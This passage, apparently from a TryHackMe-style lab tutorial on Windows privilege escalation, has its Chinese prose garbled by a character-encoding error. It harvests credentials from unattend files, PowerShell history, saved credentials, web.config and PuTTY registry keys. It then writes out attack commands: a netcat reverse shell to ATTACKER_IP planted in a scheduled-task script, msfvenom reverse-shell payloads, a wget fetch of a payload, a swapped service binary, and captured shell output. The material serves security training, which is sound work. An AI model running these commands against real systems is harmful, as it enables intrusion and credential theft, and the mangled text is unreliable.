æ—¶ï¼Œç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨ Windows éƒ¨ç½²æœåŠ¡ï¼Œè¯¥æœåŠ¡å…è®¸é€šè¿‡ç½‘ç»œå°†å•ä¸ªæ“ä½œç³»ç»Ÿæ˜ åƒéƒ¨ç½²åˆ°å¤šå°ä¸»æœºã€‚æ­¤ç±»å®‰è£…ç§°ä¸ºæ— äººå€¼å®ˆå®‰è£…ï¼Œå› ä¸ºå®ƒä»¬ä¸éœ€è¦ç”¨æˆ·äº¤äº’ã€‚æ­¤ç±»å®‰è£…éœ€è¦ä½¿ç”¨ç®¡ç†å‘˜å¸æˆ·æ¥æ‰§è¡Œåˆå§‹è®¾ç½®ï¼Œè¯¥è®¾ç½®æœ€ç»ˆå¯èƒ½å­˜å‚¨åœ¨è®¡ç®—æœºä¸­çš„ä»¥ä¸‹ä½ç½®ï¼š C:\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml ä½œä¸ºè¿™äº›æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œæ‚¨å¯èƒ½ä¼šé‡åˆ°å‡­æ®ï¼š &lt;Credentials&gt; &lt;Username&gt;Administrator&lt;/Username&gt; &lt;Domain&gt;thm.local&lt;/Domain&gt; &lt;Password&gt;MyPassword123&lt;/Password&gt; &lt;/Credentials&gt; 3.2 Powershell History æ¯å½“ç”¨æˆ·ä½¿ç”¨ Powershell è¿è¡Œå‘½ä»¤æ—¶ï¼Œå®ƒéƒ½ä¼šå­˜å‚¨åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶ä¼šä¿ç•™è¿‡å»çš„å‘½ä»¤ã€‚è¿™å¯¹äºå¿«é€Ÿé‡å¤ä¹‹å‰ä½¿ç”¨è¿‡çš„å‘½ä»¤å¾ˆæœ‰ç”¨ã€‚å¦‚æœç”¨æˆ·ç›´æ¥åœ¨ Powershell å‘½ä»¤è¡Œä¸­è¿è¡ŒåŒ…å«å¯†ç çš„å‘½ä»¤ï¼Œåˆ™ç¨åå¯ä»¥åœ¨ cmd.exe æç¤ºç¬¦ä¸‹ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ£€ç´¢è¯¥å¯†ç ï¼š type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt æ³¨æ„ï¼šä¸Šé¢çš„å‘½ä»¤åªèƒ½åœ¨ cmd.exe ä¸­è¿è¡Œï¼Œå› ä¸º Powershell ä¸ä¼šå°† %userprofile% è¯†åˆ«ä¸ºç¯å¢ƒå˜é‡ã€‚è¦ä» Powershell è¯»å–æ–‡ä»¶ï¼Œæ‚¨å¿…é¡»å°† %userprofile% æ›¿æ¢ä¸º $Env:userprofile ã€‚ 3.3 Windows Credentials Windows å…è®¸æˆ‘ä»¬ä½¿ç”¨å…¶ä»–ç”¨æˆ·çš„å‡­æ®ã€‚æ­¤åŠŸèƒ½è¿˜æä¾›äº†å°†è¿™äº›å‡­æ®ä¿å­˜åœ¨ç³»ç»Ÿä¸Šçš„é€‰é¡¹ã€‚ä¸‹é¢çš„å‘½ä»¤å°†åˆ—å‡ºä¿å­˜çš„å‡­æ®ï¼š cmdkey /list è™½ç„¶æ‚¨çœ‹ä¸åˆ°å®é™…çš„å¯†ç ï¼Œä½†å¦‚æœæ‚¨å‘ç°ä»»ä½•å€¼å¾—å°è¯•çš„å‡­æ®ï¼Œåˆ™å¯ä»¥å°†å®ƒä»¬ä¸ runas å‘½ä»¤å’Œ /savecred é€‰é¡¹ä¸€èµ·ä½¿ç”¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ runas /savecred /user:admin cmd.exe //ä¸Šè¿°çš„user:adminå¯åˆ†åˆ«ç”¨å¯¹åº”çš„hashå€¼æ›¿æ¢ 3.4 IIS Configuration Internet ä¿¡æ¯æœåŠ¡ (IIS) æ˜¯ Windows å®‰è£…ä¸Šçš„é»˜è®¤ Web æœåŠ¡å™¨ã€‚ IIS ä¸Šç½‘ç«™çš„é…ç½®å­˜å‚¨åœ¨åä¸º web.config çš„æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”å¯ä»¥å­˜å‚¨æ•°æ®åº“çš„å¯†ç æˆ–é…ç½®çš„èº«ä»½éªŒè¯æœºåˆ¶ã€‚æ ¹æ®å®‰è£…çš„ IIS ç‰ˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®ä¹‹ä¸€æ‰¾åˆ° web.configï¼š C:\\inetpub\\wwwroot\\web.config C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config è¿™æ˜¯åœ¨æ–‡ä»¶ä¸ŠæŸ¥æ‰¾æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„å¿«é€Ÿæ–¹æ³•ï¼š type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString 3.5 ä»è½¯ä»¶æ£€ç´¢å‡­è¯ï¼šPuTTY PuTTY æ˜¯ Windows ç³»ç»Ÿä¸Šå¸¸è§çš„ SSH å®¢æˆ·ç«¯ã€‚ç”¨æˆ·ä¸å¿…æ¯æ¬¡éƒ½æŒ‡å®šè¿æ¥å‚æ•°ï¼Œè€Œæ˜¯å¯ä»¥å­˜å‚¨ä¼šè¯ï¼Œå…¶ä¸­å¯ä»¥å­˜å‚¨ IPã€ç”¨æˆ·å’Œå…¶ä»–é…ç½®ä»¥ä¾›ä»¥åä½¿ç”¨ã€‚è™½ç„¶ PuTTY ä¸å…è®¸ç”¨æˆ·å­˜å‚¨å…¶ SSH å¯†ç ï¼Œä½†å®ƒå°†å­˜å‚¨åŒ…å«æ˜æ–‡èº«ä»½éªŒè¯å‡­æ®çš„ä»£ç†é…ç½®ã€‚ è¦æ£€ç´¢å­˜å‚¨çš„ä»£ç†å‡­æ®ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹ä¸‹æœç´¢ ProxyPasswordï¼š reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s æ³¨æ„ï¼šSimon Tatham æ˜¯ PuTTY çš„åˆ›å»ºè€…ï¼ˆä»–çš„åå­—æ˜¯è·¯å¾„çš„ä¸€éƒ¨åˆ†ï¼‰ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬è¦æ£€ç´¢å¯†ç çš„ç”¨æˆ·åã€‚è¿è¡Œä¸Šè¿°å‘½ä»¤åï¼Œå­˜å‚¨çš„ä»£ç†ç”¨æˆ·åä¹Ÿåº”è¯¥å¯è§ã€‚ æ­£å¦‚ putty å­˜å‚¨å‡­æ®ä¸€æ ·ï¼Œä»»ä½•å­˜å‚¨å¯†ç çš„è½¯ä»¶ï¼ŒåŒ…æ‹¬æµè§ˆå™¨ã€ç”µå­é‚®ä»¶å®¢æˆ·ç«¯ã€FTP å®¢æˆ·ç«¯ã€SSH å®¢æˆ·ç«¯ã€VNC è½¯ä»¶ç­‰ï¼Œéƒ½å°†æœ‰æ–¹æ³•æ¢å¤ç”¨æˆ·ä¿å­˜çš„ä»»ä½•å¯†ç ã€‚ 0x04 æƒé™æå‡ 4.1 Scheduled Tasks -è®¡åˆ’ä»»åŠ¡ æŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿä¸Šçš„è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å¯èƒ½ä¼šçœ‹åˆ°è®¡åˆ’ä»»åŠ¡ä¸¢å¤±äº†å…¶äºŒè¿›åˆ¶æ–‡ä»¶æˆ–æ­£åœ¨ä½¿ç”¨æ‚¨å¯ä»¥ä¿®æ”¹çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ å¯ä»¥ä½¿ç”¨ä¸å¸¦ä»»ä½•é€‰é¡¹çš„ schtasks å‘½ä»¤ä»å‘½ä»¤è¡Œåˆ—å‡ºè®¡åˆ’ä»»åŠ¡ã€‚è¦æ£€ç´¢æœ‰å…³ä»»ä½•æœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š å¯ä»¥ä½¿ç”¨ä¸å¸¦ä»»ä½•é€‰é¡¹çš„ schtasks å‘½ä»¤ä»å‘½ä»¤è¡Œåˆ—å‡ºè®¡åˆ’ä»»åŠ¡ã€‚è¦æ£€ç´¢æœ‰å…³ä»»ä½•æœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š C:\\&gt; schtasks /query /tn vulntask /fo list /v Folder: \\ HostName: THM-PC1 TaskName: \\vulntask Task To Run: C:\\tasks\\schtask.bat Run As User: taskusr1 æ‚¨å°†è·å¾—æœ‰å…³è¯¥ä»»åŠ¡çš„å¤§é‡ä¿¡æ¯ï¼Œä½†å¯¹æˆ‘ä»¬æ¥è¯´é‡è¦çš„æ˜¯â€œTask To Runâ€å‚æ•°ï¼Œè¯¥å‚æ•°æŒ‡ç¤ºè®¡åˆ’ä»»åŠ¡æ‰§è¡Œçš„å†…å®¹ï¼Œä»¥åŠâ€œRun As Userâ€å‚æ•°ï¼Œè¯¥å‚æ•°æ˜¾ç¤ºå°†ä½¿ç”¨çš„ç”¨æˆ·æ‰§è¡Œä»»åŠ¡ã€‚ å¦‚æœæˆ‘ä»¬å½“å‰çš„ç”¨æˆ·å¯ä»¥ä¿®æ”¹æˆ–è¦†ç›–â€œè¦è¿è¡Œçš„ä»»åŠ¡â€å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ taskusr1 ç”¨æˆ·æ‰§è¡Œçš„å†…å®¹ï¼Œä»è€Œå®ç°ç®€å•çš„æƒé™æå‡ã€‚è¦æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶æƒé™ï¼Œæˆ‘ä»¬ä½¿ç”¨ icacls ï¼š C:\\&gt; icacls c:\\tasks\\schtask.bat c:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(F) ä»ç»“æœä¸­å¯ä»¥çœ‹å‡ºï¼ŒBUILTIN\\Users ç»„å¯¹ä»»åŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶å…·æœ‰å®Œå…¨è®¿é—®æƒé™ (F)ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ .bat æ–‡ä»¶å¹¶æ’å…¥æˆ‘ä»¬å–œæ¬¢çš„ä»»ä½•æœ‰æ•ˆè´Ÿè½½ã€‚ä¸ºäº†æ‚¨çš„æ–¹ä¾¿ï¼Œå¯ä»¥åœ¨ C:\\tools ä¸Šæ‰¾åˆ° nc64.exe ã€‚è®©æˆ‘ä»¬æ›´æ”¹ bat æ–‡ä»¶ä»¥ç”Ÿæˆåå‘ shellï¼š C:\\&gt; echo c:\\tools c64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\\tasks\\schtask.bat ç„¶åï¼Œæˆ‘ä»¬åœ¨æ”»å‡»è€…æœºå™¨ä¸Šå¯åŠ¨ä¸€ä¸ªä¾¦å¬å™¨ï¼Œè¯¥ä¾¦å¬å™¨ä½äºæˆ‘ä»¬åœ¨åå‘ shell ä¸ŠæŒ‡ç¤ºçš„åŒä¸€ç«¯å£ä¸Šï¼š nc -lvp 4444 ä¸‹æ¬¡è¿è¡Œè®¡åˆ’ä»»åŠ¡æ—¶ï¼Œæ‚¨åº”è¯¥ä¼šæ”¶åˆ°å…·æœ‰taskusr1æƒé™çš„åå‘shellã€‚è™½ç„¶æ‚¨å¯èƒ½æ— æ³•åœ¨å®é™…åœºæ™¯ä¸­å¯åŠ¨ä»»åŠ¡ï¼Œè€Œå¿…é¡»ç­‰å¾…è®¡åˆ’ä»»åŠ¡è§¦å‘ï¼ˆä½†æˆ‘ä»¬ä¸ºæ‚¨çš„ç”¨æˆ·æä¾›äº†æ‰‹åŠ¨å¯åŠ¨ä»»åŠ¡çš„æƒé™ï¼Œä»¥èŠ‚çœæ‚¨çš„æ—¶é—´ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿è¡Œè¯¥ä»»åŠ¡ï¼‰ C:\\&gt; schtasks /run /tn vulntask æ‚¨å°†æŒ‰é¢„æœŸæ”¶åˆ°å…·æœ‰taskusr1æƒé™çš„åå‘shellï¼š user@attackerpc$ nc -lvp 4444 Listening on 0.0.0.0 4444 Connection received on 10.10.175.90 50649 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami wprivesc1\\taskusr1 4.2 AlwaysInstallElevated -å§‹ç»ˆå®‰è£…æå‡ Windows å®‰è£…ç¨‹åºæ–‡ä»¶ï¼ˆä¹Ÿç§°ä¸º .msi æ–‡ä»¶ï¼‰ç”¨äºåœ¨ç³»ç»Ÿä¸Šå®‰è£…åº”ç”¨ç¨‹åºã€‚å®ƒä»¬é€šå¸¸ä»¥å¯åŠ¨å®ƒçš„ç”¨æˆ·çš„æƒé™çº§åˆ«è¿è¡Œã€‚ä½†æ˜¯ï¼Œå¯ä»¥å°†å®ƒä»¬é…ç½®ä¸ºä»ä»»ä½•ç”¨æˆ·å¸æˆ·ï¼ˆç”šè‡³æ˜¯éç‰¹æƒå¸æˆ·ï¼‰ä»¥æ›´é«˜çš„æƒé™è¿è¡Œã€‚è¿™å¯èƒ½ä¼šè®©æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œçš„æ¶æ„ MSI æ–‡ä»¶ã€‚ æ³¨æ„ï¼šAlwaysInstallElevated æ–¹æ³•åœ¨æ­¤æˆ¿é—´çš„è®¡ç®—æœºä¸Šä¸èµ·ä½œç”¨ï¼Œå®ƒä»…ä¾›å‚è€ƒã€‚ æ­¤æ–¹æ³•éœ€è¦è®¾ç½®ä¸¤ä¸ªæ³¨å†Œè¡¨å€¼ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä»å‘½ä»¤è¡ŒæŸ¥è¯¢è¿™äº›å†…å®¹ã€‚ C:\\&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer C:\\&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer ä¸ºäº†èƒ½å¤Ÿåˆ©ç”¨æ­¤æ¼æ´ï¼Œä¸¤è€…éƒ½åº”è¯¥è®¾ç½®ã€‚å¦åˆ™ï¼Œåˆ©ç”¨å°†æ˜¯ä¸å¯èƒ½çš„ã€‚å¦‚æœè®¾ç½®äº†è¿™äº›ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ msfvenom ç”Ÿæˆæ¶æ„ .msi æ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi ç”±äºè¿™æ˜¯ä¸€ä¸ªåå‘ shellï¼Œæ‚¨è¿˜åº”è¯¥è¿è¡Œç›¸åº”é…ç½®çš„ Metasploit å¤„ç†ç¨‹åºæ¨¡å—ã€‚ä¼ è¾“åˆ›å»ºçš„æ–‡ä»¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿è¡Œå®‰è£…ç¨‹åºå¹¶æ¥æ”¶åå‘ shellï¼š C:\\&gt; msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi 4.3 Windows Services Windows æœåŠ¡ç”±æœåŠ¡æ§åˆ¶ç®¡ç†å™¨ (SCM) ç®¡ç†ã€‚ SCM æ˜¯ä¸€ä¸ªè´Ÿè´£æ ¹æ®éœ€è¦ç®¡ç†æœåŠ¡çŠ¶æ€ã€æ£€æŸ¥ä»»ä½•ç»™å®šæœåŠ¡çš„å½“å‰çŠ¶æ€å¹¶é€šå¸¸æä¾›é…ç½®æœåŠ¡çš„æ–¹æ³•çš„è¿›ç¨‹ã€‚ Windows è®¡ç®—æœºä¸Šçš„æ¯ä¸ªæœåŠ¡éƒ½æœ‰ä¸€ä¸ªå…³è”çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ¯å½“æœåŠ¡å¯åŠ¨æ—¶ï¼ŒSCM éƒ½ä¼šè¿è¡Œè¯¥å¯æ‰§è¡Œæ–‡ä»¶ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶å®ç°ç‰¹æ®ŠåŠŸèƒ½ä»¥ä¾¿èƒ½å¤Ÿä¸ SCM é€šä¿¡ï¼Œå› æ­¤ä»»ä½•å¯æ‰§è¡Œæ–‡ä»¶éƒ½ä¸èƒ½ä½œä¸ºæœåŠ¡æˆåŠŸå¯åŠ¨ã€‚æ¯ä¸ªæœåŠ¡è¿˜æŒ‡å®šè¯¥æœåŠ¡å°†åœ¨å…¶ä¸‹è¿è¡Œçš„ç”¨æˆ·å¸æˆ·ã€‚ ä¸ºäº†æ›´å¥½åœ°ç†è§£æœåŠ¡çš„ç»“æ„ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨ sc qc å‘½ä»¤æ£€æŸ¥ apphostsvc æœåŠ¡é…ç½®ï¼š C:\\&gt; sc qc apphostsvc [SC] QueryServiceConfig SUCCESS SERVICE_NAME: apphostsvc TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\system32\\svchost.exe -k apphost LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Application Host Helper Service DEPENDENCIES : SERVICE_START_NAME : localSystem åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…³è”çš„å¯æ‰§è¡Œæ–‡ä»¶æ˜¯é€šè¿‡ BINARY_PATH_NAME å‚æ•°æŒ‡å®šçš„ï¼Œç”¨äºè¿è¡ŒæœåŠ¡çš„å¸æˆ·æ˜¾ç¤ºåœ¨ SERVICE_START_NAME å‚æ•°ä¸Šã€‚ æœåŠ¡æœ‰ä¸€ä¸ªè‡ªä¸»è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆDACLï¼‰ï¼Œå®ƒæŒ‡ç¤ºè°æœ‰æƒå¯åŠ¨ã€åœæ­¢ã€æš‚åœã€æŸ¥è¯¢çŠ¶æ€ã€æŸ¥è¯¢é…ç½®æˆ–é‡æ–°é…ç½®æœåŠ¡ä»¥åŠå…¶ä»–æƒé™ã€‚ DACL å¯ä»¥ä» Process Hacker ä¸­çœ‹åˆ°ï¼ˆå¯ä»¥åœ¨æ‚¨çš„è®¡ç®—æœºæ¡Œé¢ä¸Šæ‰¾åˆ°ï¼‰ï¼š æ‰€æœ‰æœåŠ¡é…ç½®éƒ½å­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­çš„ HKLM\\SYSTEM\\CurrentControlSet\\Services\\ ä¸‹ï¼š ç³»ç»Ÿä¸­çš„æ¯ä¸ªæœåŠ¡éƒ½å­˜åœ¨ä¸€ä¸ªå­é¡¹ã€‚åŒæ ·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ ImagePath å€¼ä¸Šçœ‹åˆ°å…³è”çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶åœ¨ ObjectName å€¼ä¸Šçœ‹åˆ°ç”¨äºå¯åŠ¨æœåŠ¡çš„å¸æˆ·ã€‚å¦‚æœå·²ä¸ºè¯¥æœåŠ¡é…ç½®äº† DACLï¼Œå®ƒå°†å­˜å‚¨åœ¨åä¸º Security çš„å­é¡¹ä¸­ã€‚æ­£å¦‚æ‚¨ç°åœ¨å·²ç»çŒœåˆ°çš„ï¼Œé»˜è®¤æƒ…å†µä¸‹åªæœ‰ç®¡ç†å‘˜å¯ä»¥ä¿®æ”¹æ­¤ç±»æ³¨å†Œè¡¨é¡¹ã€‚ 4.4 æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸å®‰å…¨æƒé™ å¦‚æœä¸æœåŠ¡å…³è”çš„å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™è¾ƒå¼±ï¼Œå…è®¸æ”»å‡»è€…ä¿®æ”¹æˆ–æ›¿æ¢å®ƒï¼Œåˆ™æ”»å‡»è€…å¯ä»¥è½»æ¾è·å¾—è¯¥æœåŠ¡å¸æˆ·çš„æƒé™ã€‚ ä¸ºäº†äº†è§£å…¶å·¥ä½œåŸç†ï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ Splinterware System Scheduler ä¸Šå‘ç°çš„æ¼æ´ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ sc æŸ¥è¯¢æœåŠ¡é…ç½®ï¼š C:\\&gt; sc qc WindowsScheduler [SC] QueryServiceConfig SUCCESS SERVICE_NAME: windowsscheduler TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\PROGRA~2\\SYSTEM~1\\WService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : System Scheduler Service DEPENDENCIES : SERVICE_START_NAME : .\\svcuser1 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¼æ´è½¯ä»¶å®‰è£…çš„æœåŠ¡ä»¥ svcuser1 èº«ä»½è¿è¡Œï¼Œä¸è¯¥æœåŠ¡å…³è”çš„å¯æ‰§è¡Œæ–‡ä»¶ä½äº C:\\Progra~2\\System~1\\WService.exe ä¸­ã€‚ç„¶åæˆ‘ä»¬ç»§ç»­æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ï¼š C:\\Users\\thm-unpriv&gt;icacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe C:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) Successfully processed 1 files; Failed processing 0 files è¿™é‡Œæœ‰ä¸€äº›æœ‰è¶£çš„äº‹æƒ…ã€‚ Everyone ç»„å¯¹æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶å…·æœ‰ä¿®æ”¹æƒé™ (M)ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç®€å•åœ°ç”¨æˆ‘ä»¬åå¥½çš„ä»»ä½•æœ‰æ•ˆè´Ÿè½½è¦†ç›–å®ƒï¼Œå¹¶ä¸”è¯¥æœåŠ¡å°†ä½¿ç”¨é…ç½®çš„ç”¨æˆ·å¸æˆ·çš„æƒé™æ‰§è¡Œå®ƒã€‚ è®©æˆ‘ä»¬ä½¿ç”¨ msfvenom ç”Ÿæˆä¸€ä¸ª exe-service è´Ÿè½½å¹¶é€šè¿‡ python Web æœåŠ¡å™¨æä¾›å®ƒï¼š user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe user@attackerpc$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä» Powershell ä¸­æå–æœ‰æ•ˆè´Ÿè½½ï¼š wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe ä¸€æ—¦æœ‰æ•ˆè´Ÿè½½ä½äº Windows æœåŠ¡å™¨ä¸­ï¼Œæˆ‘ä»¬å°±ç»§ç»­ç”¨æœ‰æ•ˆè´Ÿè½½æ›¿æ¢æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶ã€‚ç”±äºæˆ‘ä»¬éœ€è¦å¦ä¸€ä¸ªç”¨æˆ·æ¥æ‰§è¡Œæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå› æ­¤æˆ‘ä»¬è¿˜å¸Œæœ›å‘Everyoneç»„æˆäºˆå®Œå…¨æƒé™ï¼š C:\\&gt; cd C:\\PROGRA~2\\SYSTEM~1\\ C:\\PROGRA~2\\SYSTEM~1&gt; move WService.exe WService.exe.bkp 1 file(s) moved. C:\\PROGRA~2\\SYSTEM~1&gt; move C:\\Users\\thm-unpriv\\rev-svc.exe WService.exe 1 file(s) moved. C:\\PROGRA~2\\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F Successfully processed 1 files. æˆ‘ä»¬åœ¨æ”»å‡»è€…æœºå™¨ä¸Šå¯åŠ¨ä¸€ä¸ªåå‘ä¾¦å¬å™¨ï¼š user@attackerpc$ nc -lvp 4445 æœ€åï¼Œé‡æ–°å¯åŠ¨æœåŠ¡ã€‚è™½ç„¶åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½éœ€è¦ç­‰å¾…æœåŠ¡é‡æ–°å¯åŠ¨ï¼Œä½†æ‚¨å·²è¢«åˆ†é…äº†è‡ªè¡Œé‡æ–°å¯åŠ¨æœåŠ¡çš„æƒé™ï¼Œä»¥èŠ‚çœä¸€äº›æ—¶é—´ã€‚ä» cmd.exe å‘½ä»¤æç¤ºç¬¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š C:\\&gt; sc stop windowsscheduler C:\\&gt; sc start windowsscheduler æ³¨æ„ï¼šPowerShell å°† sc ä½œä¸º Set-Content çš„åˆ«åï¼Œå› æ­¤æ‚¨éœ€è¦ä½¿ç”¨ sc.exe æ‰èƒ½ä»¥è¿™ç§æ–¹å¼ä½¿ç”¨ PowerShell æ§åˆ¶æœåŠ¡ã€‚ ç»“æœï¼Œæ‚¨å°†è·å¾—å…·æœ‰ svcusr1 æƒé™çš„åå‘ shellï¼š user@attackerpc$ nc -lvp 4445 Listening on 0.0.0.0 4445 Connection received on 10.10.175.90 50649 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami wprivesc1\\svcusr1 4.5 æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„ å½“æˆ‘ä»¬æ— æ³•åƒä»¥å‰ä¸€æ ·ç›´æ¥å†™å…¥æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œä»ç„¶æœ‰æœºä¼šé€šè¿‡ä½¿ç”¨ç›¸å½“æ¨¡ç³Šçš„åŠŸèƒ½æ¥å¼ºåˆ¶æœåŠ¡è¿è¡Œä»»æ„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ ä½¿ç”¨ Windows æœåŠ¡æ—¶ï¼Œå½“æœåŠ¡é…ç½®ä¸ºæŒ‡å‘â€œæœªåŠ å¼•å·â€çš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œä¼šå‡ºç°éå¸¸ç‰¹æ®Šçš„è¡Œä¸ºã€‚ä¸åŠ å¼•å·æ˜¯æŒ‡æœªæ­£ç¡®å¼•ç”¨å…³è”å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ä»¥è§£å†³å‘½ä»¤ä¸­çš„ç©ºæ ¼é—®é¢˜ã€‚ ä½œä¸ºç¤ºä¾‹ï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸¤ä¸ªæœåŠ¡ä¹‹é—´çš„åŒºåˆ«ï¼ˆè¿™äº›æœåŠ¡ä»…ç”¨ä½œç¤ºä¾‹ï¼Œå¯èƒ½åœ¨æ‚¨çš„è®¡ç®—æœºä¸­ä¸å¯ç”¨ï¼‰ã€‚ç¬¬ä¸€ä¸ªæœåŠ¡å°†ä½¿ç”¨æ­£ç¡®çš„å¼•ç”¨ï¼Œä»¥ä¾¿ SCM æ¯«æ— ç–‘é—®åœ°çŸ¥é“å®ƒå¿…é¡»æ‰§è¡Œ \"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe\" æŒ‡å‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåè·Ÿç»™å®šçš„å‚æ•°ï¼š C:\\&gt; sc qc \"vncserver\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: vncserver TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : \"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe\" -service LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : VNC Server DEPENDENCIES : SERVICE_START_NAME : LocalSystem è¯·è®°ä½ï¼šPowerShell å°†â€œscâ€ä½œä¸ºâ€œSet-Contentâ€çš„åˆ«åï¼Œå› æ­¤ï¼Œå¦‚æœæ‚¨å¤„äº PowerShell æç¤ºç¬¦ä¸­ï¼Œåˆ™éœ€è¦ä½¿ç”¨â€œsc.exeâ€æ¥æ§åˆ¶æœåŠ¡ã€‚ 